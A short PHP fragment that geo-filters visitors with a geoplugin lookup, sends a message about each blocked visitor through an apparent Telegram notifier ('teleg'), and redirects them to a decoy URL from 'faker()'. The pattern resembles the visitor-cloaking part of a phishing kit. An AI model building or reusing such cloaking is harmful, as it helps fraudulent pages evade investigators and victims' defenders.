<?php
$countryCode = $respo->geoplugin_countryCode;
if (!in_array($countryCode, $country_code)) {
    $info_mm5 = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' tried to access from country that is not allowed , blocked!';
    if ($full_notification) {
        teleg($info_mm5);
    }
    header('Location: ' . faker());
    exit();
} ?>